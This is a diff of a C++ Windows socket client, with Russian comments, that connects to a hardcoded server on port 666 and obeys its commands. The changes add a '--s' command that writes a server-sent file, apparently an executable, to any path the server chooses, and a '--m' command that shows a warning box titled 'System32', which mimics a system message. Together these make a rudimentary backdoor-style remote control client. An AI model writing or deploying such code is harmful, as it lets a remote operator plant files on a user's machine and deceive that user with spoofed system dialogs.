@@ -1,14 +1,16 @@
 //Client
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <stdio.h>
-#include <string.h>
+#include <string>
 #include <iostream>
 #include <winsock2.h>
 #include <windows.h>
 
 #define PORT 666
-#define SERVERADDR "(*.*.*.*" 
+#define SERVERADDR "192.168.1.69" 
 #pragma comment(lib,"Ws2_32.lib")
+
+using namespace std;
 
 int main(int argc, char* argv[])
 {
@@ -79,15 +81,13 @@ int main(int argc, char* argv[])
 
 		buff[nsize] = 0;
 
-		printf("Server=>Client:%s", buff);
+		printf("Server => Client:%s", buff);
 
-		std::string acp = buff;
-		if (acp == "open") {
-			std::cout << "correct\n";
-		}
-		else if (acp=="--s") {
+			if((buff[0]=='-')&&(buff[1]=='-')&&(buff[2] == 's')) {
+				std::cout << "Принимаю файл\n";
 			HANDLE hFile;
-			hFile = CreateFile("C:\\Users\\User\\Desktop\\temp\\Downloaded.exe",  // имя файла 
+			std::string result = buff + 4;
+			hFile = CreateFile(result.c_str(),  // имя файла 
 				GENERIC_WRITE,
 				0,
 				NULL,
@@ -113,13 +113,14 @@ int main(int argc, char* argv[])
 			std::cout << "Можно выходить\n";
 			CloseHandle(hFile);
 		}
-		else {
-			std::cout << MessageBox(NULL, buff, "Surprise", MB_OK | MB_ICONWARNING);
+		else if((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'm')){
+			std::string result = buff + 4;
+			std::cout << MessageBox(NULL, result.c_str(), "System32", MB_OK | MB_ICONWARNING);
 		}
 	}
 	printf("Recv error %d\n", WSAGetLastError());
 	closesocket(my_sock);
 	WSACleanup();
 	system("pause");
-	return 0;
+	return -1;
 }
